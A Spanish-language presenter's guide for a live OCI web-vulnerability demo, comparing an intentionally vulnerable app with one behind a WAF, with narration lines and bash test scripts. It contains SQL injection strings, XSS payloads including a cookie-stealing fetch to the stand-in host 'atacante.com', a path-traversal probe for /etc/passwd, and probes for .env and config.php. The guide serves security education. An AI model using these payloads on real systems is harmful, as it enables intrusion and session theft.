# 📋 Instrucciones Detalladas - Demo de Vulnerabilidades

## 🎯 Objetivo de Este Documento

Esta guía te proporcionará **instrucciones paso a paso** para ejecutar una demostración profesional de vulnerabilidades web, comparando un entorno **SIN protecciones** vs **CON protecciones completas** en OCI.

## ⏱️ Tiempo Total Estimado: 25-30 minutos

---

## 🚀 FASE 1: PREPARACIÓN PRE-DEMO (10 minutos antes)

### ✅ Checklist de Preparación

- [ ] **Infraestructura desplegada** (SIN-WAF o CON-WAF según corresponda)
- [ ] **URLs funcionando** correctamente
- [ ] **Scripts de demo** preparados
- [ ] **Navegador configurado** con pestañas preparadas
- [ ] **Terminal abierto** con comandos listos
- [ ] **Pantalla compartida** configurada

### 🔧 Verificación Técnica Rápida

```bash
# 1. Verificar que la aplicación responde
curl -I http://[TU_URL_APLICACION]

# 2. Verificar que las vulnerabilidades están activas
curl -s "http://[TU_URL_APLICACION]" | grep -i "vulnerabilidad"

# 3. Obtener información de despliegue
terraform output architecture_summary
```

---

## 🎭 FASE 2: EJECUCIÓN DE LA DEMO

### 📍 **SECCIÓN 1: INTRODUCCIÓN** (3 minutos)

#### 🎬 Script de Apertura
> "Buenos días/tardes. Hoy vamos a realizar una demostración en vivo que les mostrará la diferencia crítica entre tener y no tener protecciones de seguridad en sus aplicaciones web. Vamos a simular ataques reales en un entorno controlado."

#### 🎯 Puntos Clave a Mencionar
1. **Contexto**: Aplicación web típica de empresa
2. **Vulnerabilidades**: OWASP Top 10 implementadas
3. **Objetivo**: Mostrar impacto real y soluciones
4. **Ética**: Entorno controlado, solo con fines educativos

#### 🖥️ Acciones Visuales
```bash
# Mostrar la URL en pantalla
echo "🌐 Aplicación de demo: http://[TU_URL]"
echo "🎯 Estado actual: SIN PROTECCIONES"
```

---

### 📍 **SECCIÓN 2: RECONOCIMIENTO** (4 minutos)

#### 🎬 Script Narrativo
> "Como cualquier atacante, lo primero que haría es reconocer el objetivo. Vamos a ver qué información podemos obtener de esta aplicación..."

#### 🔍 Paso 2.1: Análisis de Headers HTTP
```bash
# Comando en vivo
curl -I http://[TU_URL_APLICACION]

# Explicar mientras se ejecuta:
# "Observen que no vemos headers de seguridad como X-Frame-Options, 
# Content-Security-Policy, o X-XSS-Protection"
```

**🎯 Punto de Impacto**: "Esta ausencia de headers básicos ya nos indica que la aplicación no tiene protecciones fundamentales."

#### 🔍 Paso 2.2: Detección de Tecnologías
```bash
# Mostrar tecnologías expuestas
curl -s http://[TU_URL_APLICACION] | grep -i "powered\|server\|version" | head -3

# Explicar:
# "El atacante ahora sabe que usamos PHP, puede buscar vulnerabilidades 
# específicas para esta tecnología"
```

#### 🌐 Paso 2.3: Exploración en Navegador
1. **Abrir la aplicación** en el navegador
2. **Mostrar F12** (DevTools)
3. **Ir a Network tab**
4. **Recargar página** y mostrar headers
5. **Destacar**: "Aquí confirmamos la ausencia de protecciones"

---

### 📍 **SECCIÓN 3: ATAQUES EN VIVO** (12 minutos)

#### 💉 **ATAQUE 1: SQL INJECTION** (5 minutos)

##### 🎬 Script Dramático
> "Ahora vamos a realizar el ataque más común en aplicaciones web: SQL Injection. Con una simple comilla, voy a intentar acceder a información no autorizada..."

##### 🔥 Paso 3.1: Ataque Básico
1. **Ir a la sección** "Demo 1: SQL Injection" en la web
2. **Escribir entrada normal**: `1`
3. **Mostrar resultado**: "Usuario encontrado normalmente"

##### 💥 Paso 3.2: Provocar Error
1. **Escribir**: `1'`
2. **Enviar y mostrar**: Error SQL visible
3. **Explicar**: "¡El error nos da información valiosa sobre la base de datos!"

**🎯 Frase de Impacto**: "Con este error, un atacante real ya sabe qué tipo de base de datos usamos y cómo está estructurada."

##### 🚨 Paso 3.3: Bypass Total
1. **Escribir**: `1' OR '1'='1`
2. **Enviar y mostrar**: Acceso a TODOS los registros
3. **Explicar**: "¡Acabamos de obtener acceso a toda la base de datos!"

**🎯 Frase Crítica**: "En una aplicación real, esto significaría acceso a datos de clientes, información financiera, credenciales..."

##### 📊 Impacto Comercial
- **Datos comprometidos**: Toda la base de datos
- **Tiempo del ataque**: 30 segundos
- **Costo potencial**: Millones en multas y pérdida de confianza

#### 🎭 **ATAQUE 2: CROSS-SITE SCRIPTING (XSS)** (4 minutos)

##### 🎬 Script de Tensión
> "Ahora vamos a ver cómo un atacante puede ejecutar código malicioso en el navegador de sus usuarios..."

##### ⚡ Paso 3.4: XSS Básico
1. **Ir a la sección** "Demo 2: Cross-Site Scripting"
2. **Escribir en el campo comentario**:
   ```html
   <script>alert('¡HACKED! Sus datos han sido comprometidos')</script>
   ```
3. **Enviar y mostrar**: Popup de alerta

**🎯 Frase de Impacto**: "Si esto fuera código real, podría robar las cookies de sesión de todos los usuarios que vean esta página."

##### 🔓 Paso 3.5: XSS Realista
1. **Mostrar payload más realista**:
   ```html
   <script>
   fetch('http://atacante.com/steal?data=' + btoa(document.cookie))
   </script>
   ```
2. **Explicar**: "Este código enviaría las cookies a un servidor controlado por el atacante"

##### 📊 Impacto del XSS
- **Sesiones robadas**: Potencialmente todas
- **Credenciales capturadas**: Posible keylogging
- **Redirecciones maliciosas**: Phishing avanzado

#### 🔍 **ATAQUE 3: ANÁLISIS AVANZADO** (3 minutos)

##### 🛠️ Paso 3.6: Herramientas Profesionales
```bash
# Enumeración de directorios comunes
echo "🔍 Buscando archivos sensibles..."
curl -s -o /dev/null -w "%{http_code} " http://[TU_URL]/.env && echo "(.env)"
curl -s -o /dev/null -w "%{http_code} " http://[TU_URL]/config.php && echo "(config.php)"
curl -s -o /dev/null -w "%{http_code} " http://[TU_URL]/admin/ && echo "(admin/)"

# Explicar: "Un atacante buscaría archivos de configuración, 
# paneles de administración, backups..."
```

##### 🎯 Paso 3.7: Múltiples Vectores
```bash
# Test de múltiples vulnerabilidades
curl -s "http://[TU_URL]/?search=<img src=x onerror=alert(1)>" | grep -i "script"
curl -s "http://[TU_URL]/?file=../../../../etc/passwd" | grep -i "root"

# Explicar: "En 5 minutos hemos encontrado múltiples vectores de ataque"
```

---

### 📍 **SECCIÓN 4: DEMOSTRAR PROTECCIONES** (Solo si tienes CON-WAF desplegado) (4 minutos)

#### 🛡️ Script de Transición
> "Ahora vamos a ver qué sucede cuando tenemos las protecciones adecuadas activadas..."

#### ✅ Paso 4.1: Mostrar WAF Activo
1. **Cambiar a URL protegida** (si está disponible)
2. **Mostrar indicador visual**: "🛡️ WAF ACTIVADO"
3. **Intentar los mismos ataques**

#### 🚫 Paso 4.2: Ataques Bloqueados
1. **Mismo SQL Injection**: `1' OR '1'='1`
2. **Resultado**: Error 403 - Blocked by WAF
3. **Mismo XSS**: `<script>alert('XSS')</script>`
4. **Resultado**: Bloqueado antes de llegar al servidor

**🎯 Frase Poderosa**: "El WAF detectó y bloqueó estos ataques en milisegundos, antes de que llegaran a nuestra aplicación."

---

### 📍 **SECCIÓN 5: ANÁLISIS DE IMPACTO** (3 minutos)

#### 📊 Comparativa Visual

| Aspecto | SIN Protecciones | CON Protecciones |
|---------|------------------|------------------|
| SQL Injection | ❌ Vulnerable | ✅ Bloqueado |
| XSS | ❌ Vulnerable | ✅ Bloqueado |
| Headers Seguridad | ❌ Ausentes | ✅ Implementados |
| Monitoreo | ❌ Sin alertas | ✅ Cloud Guard activo |
| Tiempo detección | ❌ Días/semanas | ✅ Tiempo real |

#### 💰 Impacto Financiero
- **Costo promedio violación**: $4.45 millones USD
- **Tiempo promedio detección**: 287 días
- **Con WAF**: 85% de ataques bloqueados automáticamente

---

## 🎯 FASE 3: CIERRE Y LLAMADAS A LA ACCIÓN (3 minutos)

### 🔥 Mensajes Clave de Cierre

#### Para Equipos Técnicos
> "¿Cuántas aplicaciones en su organización podrían estar expuestas a estos mismos ataques ahora mismo?"

#### Para Equipos de Negocio
> "¿Cuál sería el impacto en sus ingresos si estos ataques fueran exitosos contra sus sistemas de producción?"

#### Para Liderazgo
> "La pregunta no es si van a ser atacados, sino cuándo. ¿Prefieren estar preparados o ser reactivos?"

### 📞 Próximos Pasos Sugeridos

1. **Auditoría de seguridad** de aplicaciones actuales
2. **Implementación de WAF** en aplicaciones críticas
3. **Activación de Cloud Guard** para monitoreo continuo
4. **Capacitación del equipo** en secure coding

---

## 🛠️ SCRIPTS AUTOMATIZADOS PARA LA DEMO

### Script 1: Verificación Rápida
```bash
#!/bin/bash
# Archivo: scripts/quick-check.sh

URL=$1
echo "🔍 Verificando aplicación: $URL"

echo "1. Verificando conectividad..."
curl -s -o /dev/null -w "%{http_code}\n" $URL

echo "2. Verificando headers de seguridad..."
curl -I $URL 2>/dev/null | grep -E "(X-Frame|X-XSS|Content-Security)" || echo "❌ Headers de seguridad ausentes"

echo "3. Verificando vulnerabilidades..."
curl -s "$URL" | grep -i "vulnerabilidad" | head -1

echo "✅ Aplicación lista para demo"
```

### Script 2: Test de Vulnerabilidades
```bash
#!/bin/bash
# Archivo: scripts/vulnerability-test.sh

URL=$1
echo "🚨 Iniciando tests de vulnerabilidad en: $URL"

echo "🔍 Test 1: SQL Injection"
response=$(curl -s "$URL/?id=1'")
if echo "$response" | grep -i "error\|sql\|mysql" > /dev/null; then
    echo "❌ VULNERABLE: SQL Injection detectada"
else
    echo "✅ PROTEGIDO: Sin respuesta de error SQL"
fi

echo "🔍 Test 2: XSS"
response=$(curl -s "$URL/?search=<script>alert(1)</script>")
if echo "$response" | grep -i "script" > /dev/null; then
    echo "❌ VULNERABLE: XSS potencial detectado"
else
    echo "✅ PROTEGIDO: Script bloqueado o sanitizado"
fi

echo "🔍 Test 3: Headers de Seguridad"
headers=$(curl -I $URL 2>/dev/null)
if echo "$headers" | grep -E "(X-Frame-Options|Content-Security-Policy)" > /dev/null; then
    echo "✅ PROTEGIDO: Headers de seguridad presentes"
else
    echo "❌ VULNERABLE: Headers de seguridad ausentes"
fi

echo "📊 Tests completados"
```

### Script 3: Generador de Reporte
```bash
#!/bin/bash
# Archivo: scripts/generate-report.sh

URL=$1
TIMESTAMP=$(date "+%Y-%m-%d_%H-%M-%S")
REPORT_FILE="security-report-$TIMESTAMP.md"

echo "📋 Generando reporte de seguridad para: $URL"

cat > $REPORT_FILE << EOF
# 🛡️ Reporte de Seguridad - $(date)

## 🎯 URL Analizada
$URL

## 🔍 Resultados de Análisis

### Headers HTTP
\`\`\`
$(curl -I $URL 2>/dev/null)
\`\`\`

### Test de Vulnerabilidades

#### SQL Injection
- **Test**: \`$URL/?id=1'\`
- **Resultado**: $(curl -s "$URL/?id=1'" | grep -i "error\|sql" | head -1 || echo "Sin errores detectados")

#### Cross-Site Scripting
- **Test**: \`$URL/?search=<script>alert(1)</script>\`
- **Resultado**: $(curl -s "$URL/?search=<script>alert(1)</script>" | grep -i "script" | head -1 || echo "Sin scripts detectados")

## 📊 Resumen Ejecutivo
$(if curl -I $URL 2>/dev/null | grep -E "(X-Frame-Options|Content-Security-Policy)" > /dev/null; then echo "✅ Aplicación con protecciones básicas"; else echo "❌ Aplicación vulnerable - requiere protecciones"; fi)

---
*Reporte generado automáticamente*
EOF

echo "✅ Reporte generado: $REPORT_FILE"
```

---

## 📱 TIPS PARA UNA DEMO EXITOSA

### ✅ Antes de la Demo
- [ ] **Probar todos los comandos** 24 horas antes
- [ ] **Tener URLs en favoritos** del navegador
- [ ] **Preparar screenshots** como respaldo
- [ ] **Verificar conectividad** de red
- [ ] **Ajustar zoom** de pantalla para visibilidad

### 🎭 Durante la Demo
- [ ] **Hablar mientras esperas** (curls pueden tardar)
- [ ] **Explicar el "por qué"** antes del "qué"
- [ ] **Hacer pausas dramáticas** antes de resultados
- [ ] **Usar preguntas retóricas** para mantener atención
- [ ] **Conectar con casos reales** (Equifax, etc.)

### 🚀 Después de la Demo
- [ ] **Compartir este repositorio** para referencia
- [ ] **Programar follow-up** técnico
- [ ] **Enviar documentación** adicional
- [ ] **Destruir recursos** para evitar costos

---

## 🆘 TROUBLESHOOTING DURANTE LA DEMO

### ❌ Problema: Aplicación no responde
**Solución rápida:**
```bash
# Verificar estado de los recursos
terraform state list | grep compute
# Mostrar screenshot de respaldo mientras investigas
```

### ❌ Problema: Vulnerabilidades no funcionan
**Solución rápida:**
```bash
# Verificar que la aplicación vulnerable está corriendo
curl -s "http://[URL]" | grep -i "demo.*vulnerabilidad"
# Usar comandos curl como alternativa visual
```

### ❌ Problema: Internet lento
**Solución rápida:**
- Tener screenshots preparados
- Usar comandos curl pre-ejecutados
- Mostrar logs guardados como ejemplos

---

## 🎯 FRASES PODEROSAS PARA MEMORIZAR

### 🔥 De Apertura
- "Con una simple comilla, voy a acceder a toda su base de datos..."
- "Lo que van a ver sucede en el 70% de aplicaciones web actuales"
- "Esto es lo que un atacante real haría en menos de 5 minutos"

### 💥 Durante Ataques
- "¡Miren! El error nos está dando información confidencial del sistema"
- "Con 20 caracteres acabo de comprometer toda la aplicación"
- "Imaginen si esto fuera su aplicación bancaria..."

### ⚡ De Impacto
- "Sin WAF, es como dejar la puerta de casa abierta"
- "Cada campo sin validar es una puerta abierta al atacante"
- "La pregunta no es si van a ser atacados, sino cuándo"

---

**🎯 ¡Ahora tienes todo lo necesario para una demo impactante y profesional!** 

Recuerda: El objetivo no es asustar, sino educar y mostrar el valor de las soluciones de seguridad de Oracle Cloud Infrastructure.